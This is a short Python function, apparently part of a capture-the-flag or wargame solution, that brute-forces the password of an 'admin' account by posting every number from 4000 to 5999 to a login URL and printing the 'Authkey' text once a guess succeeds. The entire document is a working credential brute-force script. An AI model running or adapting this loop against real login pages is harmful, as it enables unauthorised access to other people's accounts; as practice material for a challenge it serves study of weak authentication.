def part3(session, URL, cookie):
    for i in range(4000, 5999) :
        data3={
            "id":"admin",
            "pw":i
           }

        req3=session.post(URL, cookies=cookie, data=data3)
        if (req3.text.find("Password Incorrect!") == -1 ) :
            index=req3.text.find("Authkey")
            print ("\n\n")
            print (req3.text[index:index+30])
            print ("\n\n")
            input("Press Any KEY to exit......")
            exit (0)
#        else :
#            print ("proc 3")
